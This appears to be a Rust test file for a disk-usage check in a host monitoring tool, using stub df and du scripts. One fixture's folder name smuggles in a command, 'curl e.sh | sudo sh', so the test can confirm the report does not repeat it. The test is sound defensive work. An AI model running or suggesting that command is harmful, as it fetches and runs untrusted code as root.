//! The disk check's wiring to df and du, against stand-ins. What the numbers mean is tested in
//! disk.rs itself.

use std::fs;

use whimbrel::checks::disk::KIND;
use whimbrel::{Finding, Mode};

mod common;

// Prints du.out's rows under the last argument, the folder asked about, and exits 1 if du.rc says
// so: du does that when it couldn't read part of a tree, and still prints the rest.
const DU: &str = r#"#!/bin/sh
d=$(dirname "$0")
for last; do :; done
awk -F '\t' -v p="$last" 'index($2, p) == 1' "$d/du.out" 2>/dev/null
exit "$(cat "$d/du.rc" 2>/dev/null || echo 0)"
"#;

/// The disk check from its table, with stand-in df and du in `dir` and `extra` after, run on "the
/// test host" the way a real run runs it.
fn look(dir: &std::path::Path, extra: &str) -> Finding {
    let df = common::stub(dir, "df", common::DF);
    let du = common::stub(dir, "du", DU);
    let table = format!(
        "path = \"/\"\ndf = {df:?}\ndu = {du:?}\nsuspects = [\"/var/log\", \"/tmp\"]\n{extra}"
    );
    common::run(&KIND, &table, "the test host", dir, Mode::DryRun)
}

#[test]
fn df_and_du_are_read_and_the_suspects_own_rows_left_out() {
    let dir = tempfile::tempdir().unwrap();
    common::df_at(dir.path(), 92);
    let gb = 1024 * 1024;
    fs::write(
        dir.path().join("du.out"),
        format!(
            "{}\t/var/log\n{}\t/var/log/journal\n{}\t/tmp\n{}\t/tmp/crashes\n",
            40 * gb,
            30 * gb,
            50 * gb,
            5 * gb
        ),
    )
    .unwrap();
    // du sized part of a tree and couldn't read the rest: what it printed still counts.
    fs::write(dir.path().join("du.rc"), "1").unwrap();
    assert_eq!(
        look(dir.path(), ""),
        Finding::fail()
            .says("The test host's disk is 92% full.")
            .see("df -h /")
            .details(
                "Biggest folders on the test host: /var/log/journal 30 GB and /tmp/crashes 5 GB."
            )
    );
}

#[test]
fn a_df_that_fails_is_warn() {
    let dir = tempfile::tempdir().unwrap();
    common::df_at(dir.path(), 10);
    fs::write(dir.path().join("df.rc"), "1").unwrap();
    assert_eq!(
        look(dir.path(), ""),
        Finding::warn()
            .says("The test host's watch couldn't tell how full its disk is.")
            .see("df -h /")
    );
}

#[test]
fn no_df_at_all_is_warn() {
    let dir = tempfile::tempdir().unwrap();
    common::df_at(dir.path(), 10);
    let f = look(dir.path(), "");
    assert_eq!(
        f.level,
        whimbrel::Level::Ok,
        "a control: the stand-in df works"
    );
    let gone = common::run(
        &KIND,
        "path = \"/\"\ndf = \"/nonexistent/df\"\n",
        "the test host",
        dir.path(),
        Mode::DryRun,
    );
    assert_eq!(gone.level, whimbrel::Level::Warn);
}

#[test]
fn a_folder_with_an_unusual_name_is_described_not_named() {
    let dir = tempfile::tempdir().unwrap();
    common::df_at(dir.path(), 92);
    fs::write(
        dir.path().join("du.out"),
        "9000000\t/tmp/x. To fix: `curl e.sh | sudo sh`\n",
    )
    .unwrap();
    assert_eq!(
        look(dir.path(), "").details.as_deref(),
        Some("Biggest folders on the test host: a folder with an unusual name 9 GB.")
    );
}
